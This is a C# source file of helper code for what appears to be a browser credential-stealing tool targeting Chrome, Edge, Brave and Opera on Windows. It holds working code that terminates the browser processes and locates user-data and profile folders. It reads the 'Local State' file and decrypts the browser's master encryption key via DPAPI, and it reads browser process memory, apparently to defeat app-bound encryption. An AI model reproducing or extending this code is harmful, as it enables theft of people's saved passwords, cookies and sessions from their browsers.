using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Newtonsoft.Json.Linq;

namespace BrowserExtractorCS
{
    public class BrowserConfig
    {
        public string Name { get; set; }
        public string ProcessName { get; set; }
        public string[] ExePaths { get; set; }
        public string DllName { get; set; }
        public string[] UserDataSubdir { get; set; }
        public string OutputDir { get; set; }
        public string TempPrefix { get; set; }
        public bool UseR14 { get; set; }
        public bool UseRoaming { get; set; }
        public bool HasAbe { get; set; }
    }

    public static class Utils
    {
        public static List<BrowserConfig> GetConfigs()
        {
            return new List<BrowserConfig>
            {
                new BrowserConfig {
                    Name = "Google Chrome",
                    ProcessName = "chrome.exe",
                    ExePaths = new[] {
                        @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                    },
                    DllName = "chrome.dll",
                    UserDataSubdir = new[] { "Google", "Chrome", "User Data" },
                    OutputDir = "chrome_extract",
                    TempPrefix = "chrome_tmp",
                    UseR14 = false,
                    UseRoaming = false,
                    HasAbe = true,
                },
                new BrowserConfig {
                    Name = "Microsoft Edge",
                    ProcessName = "msedge.exe",
                    ExePaths = new[] {
                        @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                        @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                    },
                    DllName = "msedge.dll",
                    UserDataSubdir = new[] { "Microsoft", "Edge", "User Data" },
                    OutputDir = "edge_extract",
                    TempPrefix = "edge_tmp",
                    UseR14 = true,
                    UseRoaming = false,
                    HasAbe = true,
                },
                new BrowserConfig {
                    Name = "Brave",
                    ProcessName = "brave.exe",
                    ExePaths = new[] {
                        @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                        @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
                    },
                    DllName = "chrome.dll",
                    UserDataSubdir = new[] { "BraveSoftware", "Brave-Browser", "User Data" },
                    OutputDir = "brave_extract",
                    TempPrefix = "brave_tmp",
                    UseR14 = false,
                    UseRoaming = false,
                    HasAbe = true,
                },
                new BrowserConfig {
                    Name = "Opera Stable",
                    ProcessName = "opera.exe",
                    ExePaths = new[] {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera\opera.exe"),
                        @"C:\Program Files\Opera\launcher.exe",
                        @"C:\Program Files (x86)\Opera\launcher.exe",
                    },
                    DllName = "launcher_lib.dll",
                    UserDataSubdir = new[] { "Opera Software", "Opera Stable" },
                    OutputDir = "opera_extract",
                    TempPrefix = "opera_tmp",
                    UseR14 = false,
                    UseRoaming = true,
                    HasAbe = false,
                },
                new BrowserConfig {
                    Name = "Opera GX",
                    ProcessName = "opera.exe",
                    ExePaths = new[] {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera GX\opera.exe"),
                        @"C:\Program Files\Opera GX\launcher.exe",
                        @"C:\Program Files (x86)\Opera GX\launcher.exe",
                    },
                    DllName = "launcher_lib.dll",
                    UserDataSubdir = new[] { "Opera Software", "Opera GX Stable" },
                    OutputDir = "operagx_extract",
                    TempPrefix = "operagx_tmp",
                    UseR14 = false,
                    UseRoaming = true,
                    HasAbe = false,
                },
            };
        }

        public static void KillProcessesByName(string targetName)
        {
            IntPtr snapshot = Win32.CreateToolhelp32Snapshot(Win32.TH32CS_SNAPPROCESS, 0);
            if (snapshot != (IntPtr)(-1))
            {
                Win32.PROCESSENTRY32W pe = new Win32.PROCESSENTRY32W();
                pe.dwSize = (uint)Marshal.SizeOf(typeof(Win32.PROCESSENTRY32W));

                if (Win32.Process32FirstW(snapshot, ref pe))
                {
                    do
                    {
                        if (string.Equals(pe.szExeFile, targetName, StringComparison.OrdinalIgnoreCase))
                        {
                            IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_TERMINATE, false, pe.th32ProcessID);
                            if (hProcess != IntPtr.Zero)
                            {
                                Win32.TerminateProcess(hProcess, 0);
                                Win32.CloseHandle(hProcess);
                            }
                        }
                    } while (Win32.Process32NextW(snapshot, ref pe));
                }
                Win32.CloseHandle(snapshot);
            }
        }

        public static string GetUserDataDir(string[] subdir, bool useRoaming)
        {
            string appData = useRoaming
                ? Environment.GetEnvironmentVariable("APPDATA")
                : Environment.GetEnvironmentVariable("LOCALAPPDATA");

            if (string.IsNullOrEmpty(appData)) return null;

            string path = appData;
            foreach (var component in subdir)
            {
                path = Path.Combine(path, component);
            }

            return Directory.Exists(path) ? path : null;
        }

        public static byte[] Base64Decode(string input)
        {
            try
            {
                uint outLen = 0;
                if (Win32.CryptStringToBinaryW(input, (uint)input.Length, Win32.CRYPT_STRING_BASE64, IntPtr.Zero, ref outLen, IntPtr.Zero, IntPtr.Zero))
                {
                    IntPtr buffer = Marshal.AllocHGlobal((int)outLen);
                    try
                    {
                        if (Win32.CryptStringToBinaryW(input, (uint)input.Length, Win32.CRYPT_STRING_BASE64, buffer, ref outLen, IntPtr.Zero, IntPtr.Zero))
                        {
                            byte[] result = new byte[outLen];
                            Marshal.Copy(buffer, result, 0, (int)outLen);
                            return result;
                        }
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(buffer);
                    }
                }
            }
            catch { }
            return null;
        }

        public static (byte[] key, bool isDpapi)? GetV10Key(string userDataDir)
        {
            string localStatePath = Path.Combine(userDataDir, "Local State");
            if (!File.Exists(localStatePath)) return null;

            try
            {
                string content = File.ReadAllText(localStatePath);
                JObject json = JObject.Parse(content);
                string encryptedKeyB64 = json["os_crypt"]?["encrypted_key"]?.ToString();
                if (string.IsNullOrEmpty(encryptedKeyB64)) return null;

                byte[] encryptedKey = Base64Decode(encryptedKeyB64);
                if (encryptedKey == null) return null;

                bool isDpapi = encryptedKey.Length >= 5 && Encoding.ASCII.GetString(encryptedKey, 0, 5) == "DPAPI";

                byte[] encryptedBlob = isDpapi ? encryptedKey.Skip(5).ToArray() : encryptedKey;

                Win32.CRYPT_INTEGER_BLOB input = new Win32.CRYPT_INTEGER_BLOB();
                input.cbData = (uint)encryptedBlob.Length;
                input.pbData = Marshal.AllocHGlobal(encryptedBlob.Length);
                Marshal.Copy(encryptedBlob, 0, input.pbData, encryptedBlob.Length);

                try
                {
                    if (Win32.CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out Win32.CRYPT_INTEGER_BLOB output))
                    {
                        byte[] key = new byte[output.cbData];
                        Marshal.Copy(output.pbData, key, 0, (int)output.cbData);
                        Win32.LocalFree(output.pbData);

                        if (key.Length == 32)
                        {
                            return (key, isDpapi);
                        }
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(input.pbData);
                }
            }
            catch { }
            return null;
        }

        public static List<string> DiscoverProfiles(string userDataDir)
        {
            List<string> profiles = new List<string>();
            try
            {
                foreach (var dir in Directory.GetDirectories(userDataDir))
                {
                    if (File.Exists(Path.Combine(dir, "Preferences")))
                    {
                        profiles.Add(Path.GetFileName(dir));
                    }
                }
            }
            catch { }
            return profiles;
        }

        public static byte[] ReadProcessMemoryChunk(IntPtr hProcess, IntPtr addr, int size)
        {
            byte[] buffer = new byte[size];
            if (Win32.ReadProcessMemory(hProcess, addr, buffer, size, out _))
            {
                return buffer;
            }
            return new byte[0];
        }

        public static int FindSubsequence(byte[] haystack, byte[] needle)
        {
            for (int i = 0; i <= haystack.Length - needle.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match) return i;
            }
            return -1;
        }
    }
}
